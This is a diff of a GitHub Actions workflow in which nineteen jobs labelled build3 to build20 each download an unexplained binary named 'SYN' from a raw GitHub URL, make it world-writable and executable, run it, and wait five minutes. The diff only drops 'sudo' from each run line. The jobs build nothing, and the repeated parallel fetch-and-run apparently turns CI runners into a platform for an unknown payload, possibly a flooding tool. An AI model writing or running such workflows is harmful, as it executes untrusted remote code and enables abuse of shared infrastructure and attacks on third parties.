@@ -24,7 +24,7 @@ jobs:
         run: |
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
           chmod 777 SYN
-          sudo ./SYN
+          ./SYN
           sleep 5m
   build3:
     runs-on: ubuntu-latest
@@ -34,7 +34,7 @@ jobs:
         run: |
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
           chmod 777 SYN
-          sudo ./SYN
+          ./SYN
           sleep 5m
   build4:
     runs-on: ubuntu-latest
@@ -44,7 +44,7 @@ jobs:
         run: |
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
           chmod 777 SYN
-          sudo ./SYN
+          ./SYN
           sleep 5m
   build5:
     runs-on: ubuntu-latest
@@ -54,7 +54,7 @@ jobs:
         run: |
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
           chmod 777 SYN
-          sudo ./SYN
+          ./SYN
           sleep 5m
   build6:
     runs-on: ubuntu-latest
@@ -64,7 +64,7 @@ jobs:
         run: |
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
           chmod 777 SYN
-          sudo ./SYN
+          ./SYN
           sleep 5m
   build7:
     runs-on: ubuntu-latest
@@ -74,7 +74,7 @@ jobs:
         run: |
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
           chmod 777 SYN
-          sudo ./SYN
+          ./SYN
           sleep 5m
   build8:
     runs-on: ubuntu-latest
@@ -84,7 +84,7 @@ jobs:
         run: |
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
           chmod 777 SYN
-          sudo ./SYN
+          ./SYN
           sleep 5m
   build9:
     runs-on: ubuntu-latest
@@ -94,7 +94,7 @@ jobs:
         run: |
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
           chmod 777 SYN
-          sudo ./SYN
+          ./SYN
           sleep 5m
   build10:
     runs-on: ubuntu-latest
@@ -104,7 +104,7 @@ jobs:
         run: |
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
           chmod 777 SYN
-          sudo ./SYN
+          ./SYN
           sleep 5m
   build11:
     runs-on: ubuntu-latest
@@ -114,7 +114,7 @@ jobs:
         run: |
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
           chmod 777 SYN
-          sudo ./SYN
+          ./SYN
           sleep 5m
   build12:
     runs-on: ubuntu-latest
@@ -124,7 +124,7 @@ jobs:
         run: |
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
           chmod 777 SYN
-          sudo ./SYN
+          ./SYN
           sleep 5m
   build13:
     runs-on: ubuntu-latest
@@ -134,7 +134,7 @@ jobs:
         run: |
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
           chmod 777 SYN
-          sudo ./SYN
+          ./SYN
           sleep 5m
   build14:
     runs-on: ubuntu-latest
@@ -144,7 +144,7 @@ jobs:
         run: |
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
           chmod 777 SYN
-          sudo ./SYN
+          ./SYN
           sleep 5m
   build15:
     runs-on: ubuntu-latest
@@ -154,7 +154,7 @@ jobs:
         run: |
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
           chmod 777 SYN
-          sudo ./SYN
+          ./SYN
           sleep 5m
   build16:
     runs-on: ubuntu-latest
@@ -164,7 +164,7 @@ jobs:
         run: |
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
           chmod 777 SYN
-          sudo ./SYN
+          ./SYN
           sleep 5m
   build17:
     runs-on: ubuntu-latest
@@ -174,7 +174,7 @@ jobs:
         run: |
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
           chmod 777 SYN
-          sudo ./SYN
+          ./SYN
           sleep 5m
   build18:
     runs-on: ubuntu-latest
@@ -184,7 +184,7 @@ jobs:
         run: |
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
           chmod 777 SYN
-          sudo ./SYN
+          ./SYN
           sleep 5m
   build19:
     runs-on: ubuntu-latest
@@ -194,7 +194,7 @@ jobs:
         run: |
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
           chmod 777 SYN
-          sudo ./SYN
+          ./SYN
           sleep 5m
   build20:
     runs-on: ubuntu-latest
@@ -204,5 +204,5 @@ jobs:
         run: |
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
           chmod 777 SYN
-          sudo ./SYN
+          ./SYN
           sleep 5m
